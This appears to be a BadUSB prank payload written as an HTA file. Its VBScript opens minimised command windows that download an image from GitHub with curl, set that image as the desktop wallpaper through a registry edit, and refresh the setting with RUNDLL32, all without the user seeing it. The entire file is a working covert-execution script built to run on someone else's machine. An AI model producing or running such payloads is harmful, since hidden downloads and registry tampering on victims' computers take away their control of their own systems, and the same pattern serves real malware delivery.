<!DOCTYPE HTML>
<html>
    <head>

        <HTA:APPLICATION APPLICATIONNAME="The silly" ID=":3" VERSION="1.0" BORDER="none" WINDOWSTATE="minimize"/>
        <script language="VBScript">
            Set shell = CreateObject("Wscript.shell")
            shell.Run("cmd /c start /min cmd /c curl https://raw.githubusercontent.com/n643064/arduino-badUSB/refs/heads/master/car.bmp -o %userprofile%\car.bmp ^& exit")
            shell.Run("cmd /c reg add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v Wallpaper /t REG_SZ /d %userprofile%\car.bmp /f")
            shell.Run("cmd /c RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters  ,1,True")
        </script>
    </head>
</html>